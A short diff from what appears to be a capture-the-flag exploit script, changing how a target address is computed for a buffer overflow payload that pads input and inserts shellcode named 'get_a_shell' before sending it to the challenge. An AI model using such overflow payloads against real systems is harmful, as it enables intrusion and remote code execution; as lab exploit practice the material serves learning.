@@ -31,7 +31,8 @@ else:
 # BEGIN CHALLENGE-SPECIFIC CODE
 
 max_len = 0x80
-fn_address = 0xffffde20
+offset = 0x20 - 0x4
+fn_address = buffer_address + offset
 
 payload = (fn_address - buffer_address) * b"A" + get_a_shell + (max_len - (fn_address - buffer_address)) * b"A"
 io.sendline(payload)
